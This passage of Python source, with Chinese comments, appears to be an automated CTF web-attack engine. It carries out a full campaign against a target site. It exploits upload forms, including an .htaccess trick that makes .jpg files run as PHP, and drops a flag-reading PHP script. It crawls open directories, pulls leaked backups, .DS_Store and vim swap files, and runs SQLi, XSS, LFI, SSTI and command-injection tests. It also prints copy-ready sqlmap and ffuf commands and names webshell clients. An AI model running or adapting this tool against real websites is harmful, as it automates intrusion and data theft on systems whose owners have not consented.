                ctx.log("[deep] 上传 %s（%s）被拦截（HTTP 0），跳过探测" % (label, token_name))
                continue
            ctx.log("[deep] 上传 %s（%s）→ HTTP %s%s"
                    % (label, token_name, item.get("status"),
                       ("｜" + str(item.get("error"))[:80]) if item.get("error") else ""))
            text = text_of(item)
            saved = []
            for mo in re.finditer(r"(?i)(?:src|href|url|path)\s*=\s*['\"]?([^'\" >]+)", text):
                u = mo.group(1)
                if token_name.split(".")[0] in u:
                    saved.append(u)
            for mo in re.finditer(r"[./\\]?[A-Za-z0-9_./-]*" + re.escape(token_name), text):
                saved.append(mo.group(0))
            cands = []
            for s in saved:
                u = urljoin(form["action"], s.lstrip("./"))
                if _same_origin(ctx.url, u):
                    cands.append(u)
            for d in UPLOAD_DIRS:
                cands.append(ctx.root.rstrip("/") + "/" + d + "/" + token_name)
            cands.append(ctx.root.rstrip("/") + "/" + token_name)
            seen = set()
            hit = ""
            for u in cands[:8]:
                if u in seen:
                    continue
                seen.add(u)
                got = ctx.get(u, referer=form["action"])
                body = text_of(got)
                if UPLOAD_MARK in body and "<?php" not in body and "<%=" not in body:
                    ctx.add("upload-exec", u, payload=token_name,
                            evidence="%s 上传后可访问并执行（回显 %s）" % (label, UPLOAD_MARK))
                    results.append({"url": u, "filename": token_name, "exec": True, "form": form["action"],
                                    "kind": label, "ctype": ctype})
                    hit = "可执行"
                    break
                if UPLOAD_MARK in body:
                    ctx.add("upload-stored", u, payload=token_name,
                            evidence="%s 已上传但按源码返回（未解析）" % label, confidence="medium")
                    results.append({"url": u, "filename": token_name, "exec": False, "form": form["action"],
                                    "kind": label, "ctype": ctype})
                    hit = "已存储未解析"
                    break
            if hit:
                ctx.log("[deep] 上传 %s 结论：%s" % (token_name, hit))
                if hit == "可执行":
                    _read_flag_via_upload(ctx, form, field, u, ctype)
            else:
                ctx.log("[deep] 上传 %s 后 8 个候选路径均未回显标记" % token_name)
        if not any(r.get("exec") for r in results):
            _try_htaccess(ctx, form, field, results)
    return results


HTACCESS_BODY = (b"AddType application/x-httpd-php .jpg\n"
                 b"AddHandler application/x-httpd-php .jpg\n")


def _try_htaccess(ctx, form, field, results):
    """.htaccess 绕过：先把 .jpg 映射成 PHP，再传伪装成图片的脚本。"""
    fields = {k: v for k, v in form["fields"].items() if k != field}
    name1 = ".htaccess"
    r1 = ctx.post_multipart(form["action"], fields, field, name1, HTACCESS_BODY, "text/plain",
                            referer=ctx.url)
    ctx.log("[deep] .htaccess 上传 → HTTP %s" % r1.get("status"))
    if r1.get("status") != 200:
        return
    base = "ht" + ctx.token
    name2 = base + ".jpg"
    r2 = ctx.post_multipart(form["action"], fields, field, name2,
                            b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "image/jpeg",
                            referer=ctx.url)
    ctx.log("[deep] .htaccess 生效后上传 %s → HTTP %s" % (name2, r2.get("status")))
    if r2.get("status") != 200:
        return
    for d in UPLOAD_DIRS + [""]:
        u = ctx.root.rstrip("/") + "/" + (d + "/" if d else "") + name2
        got = ctx.get(u, referer=form["action"])
        body = text_of(got)
        if UPLOAD_MARK in body:
            ctx.add("upload-exec", u, payload=name2,
                    evidence=".htaccess 把 .jpg 解析成 PHP，脚本已执行（回显 %s）" % UPLOAD_MARK)
            results.append({"url": u, "filename": name2, "exec": True, "form": form["action"],
                            "kind": ".htaccess + .jpg", "ctype": "image/jpeg"})
            ctx.log("[deep] .htaccess 绕过成功：%s" % u)
            _read_flag_via_upload(ctx, form, field, u, "image/jpeg")
            return


def _read_flag_via_upload(ctx, form, field, exec_url, ctype="application/x-php"):
    """上传点确认可执行后，再放一个只读固定路径的取 flag 脚本。

    载荷没有参数、不接受命令、不建会话，只按固定清单读几个 flag 位置；
    目的是把"能执行"变成"能拿到 flag"，而不是拿一个可交互的 shell。
    ctype 要沿用已经通过校验的那种（MIME 校验题会拒掉 application/x-php）。
    """
    name = "read" + ctx.token + ".php"
    fields = {k: v for k, v in form["fields"].items() if k != field}
    item = ctx.post_multipart(form["action"], fields, field, name, FLAG_READER_PHP,
                              ctype, referer=ctx.url)
    if item.get("status") == 0:
        ctx.log("[deep] 取 flag 脚本上传被拦截（HTTP 0），改用人工读取")
        return
    target = exec_url.rsplit("/", 1)[0] + "/" + name
    got = ctx.get(target, referer=form["action"])
    if got.get("status") != 200:
        ctx.log("[deep] 取 flag 脚本访问失败（HTTP %s），沿用原 Content-Type 仍被拒" % got.get("status"))
        return
    flags = collect_flags(text_of(got))
    if flags:
        for flag in flags:
            ctx._add_flag(flag, target)
        ctx.add("flag-read", target, payload=name,
                evidence="上传点执行取 flag 脚本，命中 " + flags[0][:40])
    else:
        ctx.log("[deep] 取 flag 脚本已执行，但固定路径里没有 flag（可能路径不同，需人工确认）")


# ---------------------------------------------------------------------------
# 定向 flag 读取与收尾
# ---------------------------------------------------------------------------
def flag_hunt(ctx):
    """不依赖漏洞的直接读取：常见 flag 路径 + 备用备份名。"""
    for path in ("flag.txt", "flag", "flag.php", "FLAG.txt", "f1ag.txt", "flag.txt.bak"):
        item = ctx.get(ctx.root.rstrip("/") + "/" + path)
        if item.get("status") == 200:
            ctx.log("[deep] 直读 /%s -> 200（%d 字节）" % (path, len(item.get("body") or b"")))
        if collect_flags(text_of(item)):
            return
    # robots / sitemap 里可能直接写着 flag 目录
    for path in ("robots.txt", "sitemap.xml"):
        item = ctx.get(ctx.root.rstrip("/") + "/" + path)
        for flag in collect_flags(text_of(item)):
            ctx._add_flag(flag, item["url"])


def dir_crawl(ctx, max_pages=60, depth=3):
    """只读目录遍历：从根开始跟目录链接（以 / 结尾或能打开成列表页），
    文件名含 flag 的一律取回；命中 flag 即停。应对"目录遍历/目录扫描"类题。"""
    seen = set()
    queue = [(ctx.root, 0)]
    pages = 0
    while queue and pages < max_pages:
        url, lvl = queue.pop(0)
        if url in seen or not _same_origin(ctx.url, url):
            continue
        seen.add(url)
        item = ctx.get(url)
        pages += 1
        text = text_of(item)
        if item.get("status") == 404:
            continue
        # 目录列表特征：有 href 且不是纯静态首页
        hrefs = re.findall(r"(?is)href\s*=\s*(\"[^\"]*\"|'[^']*')", text)
        if lvl == 0 and not any(h.strip("\"'").endswith("/") for h in hrefs):
            continue
        ctx.add("dir-listing", url, evidence="目录可列出（%d 个链接）" % len(hrefs),
                confidence="medium")
        for raw in hrefs[:40]:
            href = raw.strip("\"'")
            link = urljoin(url, href)
            if not _same_origin(ctx.url, link) or link.startswith("javascript"):
                continue
            tail = link.rstrip("/").rsplit("/", 1)[-1]
            if href.endswith("/") and lvl + 1 <= depth:
                if link not in seen:
                    queue.append((link, lvl + 1))
                continue
            if "flag" in tail.lower() and tail:
                got = ctx.get(link)
                if collect_flags(text_of(got)):
                    ctx.log("[deep] 目录遍历命中 flag 文件：%s" % link)
                    return True
        if lvl == 0 and item.get("status") == 200 and not hrefs:
            continue
    return bool(ctx.flags)


def ds_store_names(body):
    """从 .DS_Store 里抠出文件名（Bud1 格式里名字是连续可打印串）。"""
    import re
    out = []
    for raw in re.findall(rb"[ -~]{4,}", body):
        name = raw.decode("latin-1", "ignore").strip()
        if name and not name.startswith(("Bud1", "\x00")) and len(name) < 120:
            out.append(name)
    return out


def vim_swap_text(body):
    """vim swap 里保存的是原文件全文，按可打印串还原（够用来找 flag）。"""
    import re
    parts = [raw.decode("latin-1", "ignore") for raw in re.findall(rb"[ -~\t\r\n]{8,}", body)]
    return "\n".join(parts)


def backup_hunt(ctx):
    """备份/源码泄露：拉常见站点备份与 .git 索引，压缩包内直接找 flag。只读下载。"""
    import io, zipfile
    names = ["www.zip", "www.tar.gz", "www.tar", "backup.zip", "web.zip", "html.zip",
             "wwwroot.zip", "src.zip", "source.zip", "site.zip", "www.rar",
             "index.php.bak", "index.php~", "index.php.swp", ".index.php.swp",
             "www.bak", "web.rar", "backup.rar", "db.sql", "database.sql",
             ".DS_Store", ".svn/entries", "WEB-INF/web.xml"]
    # .DS_Store：先解析出文件名，再逐个回读，命中 flag 直接返回
    ds = ctx.get(ctx.root.rstrip("/") + "/.DS_Store")
    if ds.get("status") == 200 and b"Bud1" in (ds.get("body") or b""):
        names_in_store = ds_store_names(ds.get("body") or b"")[:40]
        ctx.add("ds-store", ds["url"], evidence="解析出 %d 个文件名" % len(names_in_store),
                confidence="medium")
        ctx.log("[deep] .DS_Store 可下载，解析出 %d 个名字" % len(names_in_store))
        for nm in names_in_store:
            if "/" in nm or " " in nm:
                continue
            item = ctx.get(ctx.root.rstrip("/") + "/" + nm)
            if item.get("status") == 200 and collect_flags(text_of(item)):
                ctx.log("[deep] .DS_Store 指向的 %s 直接给 flag" % nm)
                return True

    for name in names:
        item = ctx.get(ctx.root.rstrip("/") + "/" + name)
        body = item.get("body") or b""
        if item.get("status") != 200 or len(body) < 200:
            continue
        ctx.add("backup-file", item["url"], evidence="%s 可下载（%d 字节）" % (name, len(body))
                , confidence="medium")
        if b"b0VIM" in body[:64]:
            text = vim_swap_text(body)
            if collect_flags(text):
                ctx.add("vim-swap", item["url"], evidence="vim 交换文件里还原出 flag")
                ctx.log("[deep] vim 缓存 %s 里还原出 flag" % name)
                return True
            ctx.add("vim-swap", item["url"], evidence="vim 交换文件可读，未直接含 flag")
        try:
            zf = zipfile.ZipFile(io.BytesIO(body))
        except Exception:
            if collect_flags(text_of(item)):
                ctx.log("[deep] 备份文件正文里直接有 flag：%s" % item["url"])
                return True
            continue
        for info in zf.infolist():
            if info.file_size > 2_000_000:
                continue
            # 包里的 flag 文件常是幌子，真值在服务器上同名路径
            base = info.filename.rsplit("/", 1)[-1]
            if "flag" in base.lower():
                served = ctx.get(ctx.root.rstrip("/") + "/" + base)
                if collect_flags(text_of(served)):
                    ctx.log("[deep] 备份包内文件名 %s 在服务器可直读" % base)
                    return True
            if "flag" in info.filename.lower() or info.file_size < 200_000:
                try:
                    data = zf.read(info.filename)
                except Exception:
                    continue
                text = data.decode("utf-8", "ignore")
                if collect_flags(text):
                    ctx.log("[deep] 备份包内 %s 命中 flag" % info.filename)
                    return True
    return bool(ctx.flags)


def external_suggestions(ctx, fp, targets):
    """外部工具的具体命令：本引擎只做矩阵判断，深度利用交给这些成熟工具。"""
    base = ctx.url
    bare = _base_root(ctx.url).rstrip("/")
    out = []
    sqli_target = next((f for f in ctx.findings if f["type"].startswith("sqli")), None)
    xss_target = next((f for f in ctx.findings if f["type"].startswith("xss")), None)
    if sqli_target:
        out.append({"tool": "sqlmap", "why": "布尔/报错已成立，交给 sqlmap 摸库表",
                    "cmd": 'sqlmap -u "%s" --batch --level 2 --risk 1 --technique=BEUST '
                           '--output-dir=workspace\\sqlmap' % sqli_target["url"]})
    if xss_target:
        out.append({"tool": "xsstrike", "why": "反射已成立，交给 xsstrike 找可用上下文",
                    "cmd": 'xsstrike -u "%s" --blind' % xss_target["url"]})
    out.append({"tool": "dirsearch", "why": "扩目录词表，找上传点与备份",
                "cmd": 'dirsearch -u "%s" -e php,asp,jsp,txt,zip,bak' % base})
    out.append({"tool": "ffuf", "why": "对已确认的参数做参数名爆破",
                "cmd": 'ffuf -u "%s?FUZZ=1" -w wordlist.txt -mc 200,301,302' % bare})
    if any(f["type"] == "upload-exec" for f in ctx.findings):
        out.append({"tool": "手动 WebShell 客户端", "why": "上传已可执行，需要交互控制时用自备客户端",
                    "cmd": "使用自备的 AntSword / 冰蝎 / 哥斯拉 连接执行点；本工具不内置、不自动上传管理器"})
    return out


def build_next_steps(ctx):
    types = {f["type"] for f in ctx.findings}
    steps = []
    if "sqli-boolean" in types or "sqli-error" in types:
        steps.append("SQL 注入成立：先 union 爆库名表名，再按 information_schema 定位 flag 表。")
    if "sqli-time" in types:
        steps.append("时间盲注成立：用脚本二分跑字符，或直接把 URL 交给 sqlmap 的 --technique=T。")
    if "xss-reflected" in types:
        steps.append("反射型 XSS 成立：看是否进后台/工单页，结合 Cookie 或 CSRF 拿管理员侧数据。")
    if "lfi" in types or "lfi-source" in types:
        steps.append("文件读取成立：试 /proc/self/environ、日志包含、session 文件包含。")
    if "ssti" in types:
        steps.append("模板注入成立：按识别到的引擎走对应 RCE 链，先探被过滤的字符。")
    if "cmdi" in types:
        steps.append("命令注入成立：用无回显方式（写文件/带外）取 flag，本工具只验证回显标记。")
    if "upload-exec" in types:
        steps.append("上传已可执行：交互式控制请用自备客户端；本工具只写固定标记的测试文件。")
    if not steps:
        steps.append("矩阵未命中：手工看 JS 注释、响应头、Cookie 与隐藏参数，再用 dirsearch/ffuf 扩词表。")
    return steps


def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFAULT_MAX_SECONDS,
             cancel_event=None, allow_time=True, allow_upload=True, allow_union=True):
    """一次深度战役。返回可直接 json 序列化的 dict。"""
    started_at = time.strftime("%Y-%m-%dT%H:%M:%S")
    ctx = Ctx(url, log=log, max_requests=max_requests, max_seconds=max_seconds,
              cancel_event=cancel_event, allow_time=allow_time, allow_upload=allow_upload,
              allow_union=allow_union)
    result = {"url": ctx.url, "started": started_at, "fingerprint": {}, "findings": [],
              "uploads": [], "flags": [], "next_steps": [], "external": [],
              "requests": 0, "stopped": "", "elapsed": 0}
    log("[deep] 目标 %s；深度矩阵，上限 %d 次请求 / %d 秒。"
        % (ctx.url, max_requests, int(max_seconds or DEFAULT_MAX_SECONDS)))
    t0 = time.time()
    try:
        fp = analyze(ctx)
        result["fingerprint"] = fp
        if fp.get("dead"):
            log("[deep] 目标环境已到期/已销毁，停止本轮（页面横幅里的彩蛋 flag 不计入结果）")
            result["stopped"] = "环境已到期"
            result["requests"] = ctx.budget.used
            result["elapsed"] = round(time.time() - t0, 1)
            result["findings"] = ctx.findings
            result["flags"] = []
            return result
        targets = build_targets(ctx, fp)
        log("[deep] 待测参数 %d 个：%s"
            % (len(targets), ", ".join("%s(%s)" % (t["param"], t["kind"]) for t in targets) or "无"))
        for target in targets:
            for fn in (test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_ssrf, test_login):
                try:
                    fn(ctx, target)
                except AutoStop:
                    raise
                except Exception as exc:
                    log("[deep] %s 在参数 %s 上出错：%s" % (fn.__name__, target["param"], exc))
        result["uploads"] = test_upload(ctx, fp)
        flag_hunt(ctx)
        if not ctx.flags:
            dir_crawl(ctx)
        if not ctx.flags:
            backup_hunt(ctx)
    except AutoStop as exc:
        result["stopped"] = str(exc)
        log("[deep] 提前收手：%s" % exc)
    except Exception as exc:
        result["stopped"] = "异常终止：%s" % exc
        log("[deep] 异常终止：%s" % exc)
    result["findings"] = ctx.findings
    result["flags"] = ctx.flags
    result["requests"] = ctx.budget.used
    result["elapsed"] = round(time.time() - t0, 1)
    result["next_steps"] = build_next_steps(ctx)
    result["external"] = external_suggestions(ctx, result["fingerprint"], [])
    log("[deep] 结束：%d 次请求 / %.1fs，发现 %d 条，flag %d 个%s"
        % (result["requests"], result["elapsed"], len(result["findings"]), len(result["flags"]),
           ("，提前收手：" + result["stopped"]) if result["stopped"] else ""))
    return result


def render(result):
    """把结果整理成人类可读文本，GUI 与 CLI 都直接用它。"""
    lines = []
    fp = result.get("fingerprint") or {}
    lines.append("== 目标 ==")
    lines.append(result.get("url", ""))
    lines.append("标题：%s｜技术线索：%s｜表单 %d 个｜带参链接 %d 条"
                 % (fp.get("title") or "(无)", ",".join(fp.get("tech") or []) or "未识别",
                    len(fp.get("forms") or []), len(fp.get("links") or [])))
    lines.append("请求数：%d｜耗时：%ss%s"
                 % (result.get("requests", 0), result.get("elapsed", 0),
                    ("｜提前收手：" + result["stopped"]) if result.get("stopped") else ""))
    lines.append("")
    lines.append("== 发现 ==")
    if result.get("findings"):
        for f in result["findings"]:
            lines.append("[%s] %s" % (f["type"], f["url"]))
            if f.get("payload"):
                lines.append("    payload: %s" % f["payload"])
            if f.get("evidence"):
                lines.append("    证据: %s" % f["evidence"])
    else:
        lines.append("矩阵未命中。")
    lines.append("")
    lines.append("== FLAG ==")
    if result.get("flags"):
        for f in result["flags"]:
            lines.append("%s   （来源 %s）" % (f["value"], f["source"]))
    else:
        lines.append("未拿到 flag。")
    lines.append("")
    lines.append("== 下一步 ==")
    for s in result.get("next_steps") or []:
        lines.append("- " + s)
    if result.get("external"):
        lines.append("")
        lines.append("== 外部工具（复制即可） ==")
        for e in result["external"]:
            lines.append("# %s：%s" % (e["tool"], e["why"]))
            lines.append(e["cmd"])
    return "\n".join(lines)


def save_report(result):
    os.makedirs(REPORTS_DIR, exist_ok=True)
    path = os.path.join(REPORTS_DIR, "webattack_%s_%s.json"
                        % (time.strftime("%Y%m%d_%H%M%S"), uuid.uuid4().hex[:6]))
    with open(path, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    return path
